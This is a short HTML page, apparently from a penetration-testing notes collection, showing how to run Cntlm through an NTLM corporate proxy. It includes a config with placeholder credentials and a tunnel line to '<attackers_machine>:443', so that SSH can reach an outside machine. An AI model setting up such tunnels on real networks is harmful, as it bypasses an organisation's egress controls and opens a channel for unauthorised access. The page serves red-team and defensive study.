@@ -1,0 +1,22 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>HTTP Proxy</title>
+</head><body>Cntlm<br/>
+<a href="http://cntlm.sourceforge.net/">Cntlm</a>&nbsp;(fork: <a href="https://github.com/Evengard/cntlm">https://github.com/Evengard/cntlm</a>) is the tool of choice for running any non-proxy aware programs over NTLM-proxy. Basically this tool authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. This port bound does not require any authentication so you can use your tools directly (putty/ssh for example). It uses a config file for its operation. Here’s a barebones config example to forward port 443 (this port is most likely to be allowed through the proxy):<br/>
+<br/>
+Username Alice<br/>
+Password P@ssw0rd<br/>
+Domain CONTOSO.COM<br/>
+Proxy 10.0.0.10:8080<br/>
+Tunnel 2222:&lt;attackers_machine&gt;:443<br/>
+Run it:<br/>
+<br/>
+cntlm.exe -c config.conf<br/>
+<br/>
+Or if you’re on Linux:<br/>
+<br/>
+./cntlm -c config.conf<br/>
+<br/>
+Now, given you have ssh running on the remote host on port 443, you can launch ssh client (openssh/putty) and connect to local port 2222 to get access to the external machine.</body></html>
